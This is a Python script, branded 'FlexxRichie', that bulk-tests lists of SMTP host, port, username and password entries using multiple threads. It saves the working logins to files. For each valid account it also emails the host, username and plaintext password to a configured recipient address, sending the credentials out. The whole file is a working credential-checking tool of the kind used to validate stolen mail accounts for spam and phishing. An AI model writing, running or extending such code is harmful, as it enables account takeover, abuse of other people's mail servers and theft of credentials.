import os
import sys
import time
import json
import random
import smtplib
import logging
import argparse
import concurrent.futures
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from colorama import Fore, Style, init

# Initialize Colorama
init(autoreset=True)

# Setup Logging
logging.basicConfig(
    filename="Result/logs.txt",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

# Colors
R = Fore.RED + Style.BRIGHT
G = Fore.GREEN + Style.BRIGHT
C = Fore.CYAN + Style.BRIGHT
Y = Fore.YELLOW + Style.BRIGHT
O = Style.RESET_ALL

# Clear screen
os.system('cls' if os.name == 'nt' else 'clear')

# --- Configuration ---
def load_config():
    try:
        with open("config.json", "r") as f:
            return json.load(f)
    except FileNotFoundError:
        print(f"{R}[-] config.json not found. Please create it.{O}")
        sys.exit(1)
    except json.JSONDecodeError:
        print(f"{R}[-] Invalid JSON in config.json.{O}")
        sys.exit(1)

config = load_config()
toaddr = config.get("recipient_email", "test@example.com")
default_threads = config.get("default_threads", 10)


# Banner
def logo():
    colors = [36, 32, 34, 35, 31, 37]
    banner = f"""
    ███████╗██╗     ███████╗██╗  ██╗██╗  ██╗    ██████╗ ██╗ ██████╗██╗  ██╗██╗███████╗
    ██╔════╝██║     ██╔════╝╚██╗██╔╝╚██╗██╔╝    ██╔══██╗██║██╔════╝██║ ██╔╝██║██╔════╝
    █████╗  ██║     █████╗   ╚███╔╝  ╚███╔╝     ██████╔╝██║██║     █████╔╝ ██║█████╗
    ██╔══╝  ██║     ██╔══╝   ██╔██╗  ██╔██╗     ██╔══██╗██║██║     ██╔═██╗ ██║██╔══╝
    ██║     ███████╗███████╗██╔╝ ██╗██╔╝ ██╗    ██║  ██║██║╚██████╗██║  ██╗██║███████╗
    ╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚══════╝
                                      {Fore.CYAN}Display Name: FlexxRichie{O}
    """
    for line in banner.split("\n"):
        sys.stdout.write(f"\x1b[1;{random.choice(colors)}m{line}{O}\n")
        time.sleep(0.01)

logo()

# Result folder
os.makedirs("Result", exist_ok=True)

# Result containers
good, bad = [], []
VALIDS, INVALIDS = 0, 0

def check_smtp(smtp_line: str):
    """
    Test SMTP credentials from line: HOST|PORT|USER|PASS
    """
    global VALIDS, INVALIDS, toaddr

    try:
        host, port, usr, pwd = smtp_line.strip().split('|')
        port = int(port)

        with smtplib.SMTP(host, port, timeout=10) as server:
            server.ehlo()
            server.starttls()
            server.login(usr, pwd)

            # Build test email
            msg = MIMEMultipart()
            msg["Subject"] = "SMTP Test Result - FlexxRichie"
            msg["From"] = usr
            msg["To"] = toaddr
            body = f"""
            <html>
                <body>
                    <h2>SMTP Credentials Valid</h2>
                    <p><b>HOST:</b> {host}</p>
                    <p><b>PORT:</b> {port}</p>
                    <p><b>USER:</b> {usr}</p>
                    <p><b>PASS:</b> {pwd}</p>
                </body>
            </html>
            """
            msg.attach(MIMEText(body, "html"))
            server.sendmail(usr, [toaddr], msg.as_string())

        print(G + f"[+] VALID SMTP → {smtp_line}" + O)
        logging.info(f"VALID SMTP: {smtp_line}")
        good.append(smtp_line)
        VALIDS += 1
        with open("Result/valid.txt", "a") as f:
            f.write(smtp_line + "\n")

    except (smtplib.SMTPAuthenticationError, smtplib.SMTPConnectError, smtplib.SMTPServerDisconnected) as e:
        print(R + f"[-] INVALID SMTP → {smtp_line} ({type(e).__name__})" + O)
        logging.error(f"INVALID SMTP: {smtp_line} | ERROR: {type(e).__name__} - {str(e)}")
        bad.append(smtp_line)
        INVALIDS += 1
        with open("Result/invalid.txt", "a") as f:
            f.write(smtp_line + "\n")
    except Exception as e:
        print(R + f"[-] INVALID SMTP → {smtp_line} ({str(e)})" + O)
        logging.error(f"INVALID SMTP: {smtp_line} | ERROR: {str(e)}")
        bad.append(smtp_line)
        INVALIDS += 1
        with open("Result/invalid.txt", "a") as f:
            f.write(smtp_line + "\n")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Check SMTP credentials.")
    parser.add_argument("smtp_file", help="Path to the SMTP list file.")
    parser.add_argument("-t", "--threads", type=int, default=default_threads, help=f"Number of threads (default: {default_threads}).")
    args = parser.parse_args()

    try:
        with open(args.smtp_file, "r") as f:
            smtps = f.read().splitlines()

        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
            executor.map(check_smtp, smtps)

        print(f"\n{G}[+] DONE! VALIDS: {VALIDS}, INVALIDS: {INVALIDS}{O}")
        logging.info(f"CHECK COMPLETE - VALIDS: {VALIDS}, INVALIDS: {INVALIDS}")

    except FileNotFoundError:
        print(f"{R}[-] SMTP file not found: {args.smtp_file}{O}")
        logging.error(f"SMTP file not found: {args.smtp_file}")
    except KeyboardInterrupt:
        print(f"\n{R}[!] Interrupted by user{O}")
        logging.warning("Process interrupted by user")
        sys.exit()
